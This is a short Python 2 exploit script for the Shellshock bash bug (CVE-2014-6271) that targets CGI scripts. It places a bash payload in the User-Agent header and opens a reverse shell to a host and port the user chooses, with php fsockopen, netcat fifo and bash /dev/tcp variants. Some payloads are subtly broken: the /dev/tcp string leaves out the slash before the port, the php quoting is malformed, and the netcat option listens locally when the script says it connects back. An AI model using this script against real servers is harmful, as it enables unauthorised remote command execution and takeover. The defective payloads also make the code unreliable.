#CVE-2014-6271 cgi-bin reverse shell
#Pick your shell, any shell
#example: python shellshock.py -t localhost -u /cgi/test -r localhost -p 4444 -s dev_tcp

import httplib
import urllib
import argparse


def main(args):
    print "Attempting to exploit CVE-2014-6271 on %s" % args.host
    print "We will attempt to connect back to %s %s" % (args.remote, args.port)
    conn = httplib.HTTPConnection(args.host)

    if args.shell == 'php':
        reverse_shell="() { ignored;};/bin/bash -c 'php -r '$sock=fsockopen(%s, %s);exec('/bin/sh -i <&3 >&3 2>&3');'" %(args.remote, args.port)
    elif args.shell == 'nc':
        reverse_shell="() { ignored;};/bin/bash -c '/bin/rm -f /tmp/f; /usr/bin/mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -l %s %s > /tmp/f'" %(args.remote, args.port)
    elif args.shell == 'dev_tcp':
        reverse_shell="() { ignored;};/bin/bash -i >& /dev/tcp/%s%s 0>&1" % (args.remote, args.port)

    print "We will use the following shell: " + reverse_shell

    headers = {"Content-type": "application/x-www-form-urlencoded",
    "User-Agent":reverse_shell }

    conn.request("GET",args.uri,headers=headers)
    print '\n' + '-' * 80
    print 'requesting......'
    res=conn.getresponse()
    print res.status, res.reason
    data = res.read()
    print data

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Attempt to exploit CVE-2014-6271 in vulnerable CGI servers.")

    parser.add_argument("-t", "--host", action='store', default=None, required=True,
            help="Specify a remote host to test")
    parser.add_argument("-u", "--uri", action='store', default=None, required=True,
            help="Specify a CGI script to test")
    parser.add_argument("-s", "--shell", action='store', choices=['php', 'nc', 'dev_tcp'],
            help="Specify the type of reverse shell you would like to use", default='nc', required=False)
    parser.add_argument("-r", "--remote", action='store', required=True, default=None,
            help="Specify the remote host you want to connect back to with a shell")
    parser.add_argument("-p", "--port", action='store', required=True, default=None,
            help="Specify the port you wish to connect back to with a shell")

    args = parser.parse_args()
    main(args)
